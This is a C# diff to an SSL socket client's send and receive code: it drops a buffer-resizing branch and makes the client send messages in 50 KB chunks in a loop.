@@ -125,8 +125,6 @@ namespace Client.Sockets
                                 MS.Dispose();
                                 MS = new MemoryStream();
                             }
-                            else
-                                Buffer = new byte[Buffersize - MS.Length];
                         }
                     }
                     SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
@@ -162,8 +160,23 @@ namespace Client.Sockets
 
                     Client.Poll(-1, SelectMode.SelectWrite);
                     SslClient.Write(buffersize, 0, buffersize.Length);
-                    SslClient.Write(buffer, 0, buffer.Length);
                     SslClient.Flush();
+                    int chunkSize = 50 * 1024;
+                    byte[] chunk = new byte[chunkSize];
+                    using (MemoryStream buffereReader = new MemoryStream(msg))
+                    {
+                        BinaryReader binaryReader = new BinaryReader(buffereReader);
+                        int bytesToRead = (int)buffereReader.Length;
+                        do
+                        {
+                            chunk = binaryReader.ReadBytes(chunkSize);
+                            bytesToRead -= chunkSize;
+                            SslClient.Write(chunk);
+                            SslClient.Flush();
+                        } while (bytesToRead > 0);
+
+                        binaryReader.Dispose();
+                    }
                 }
                 catch
                 {
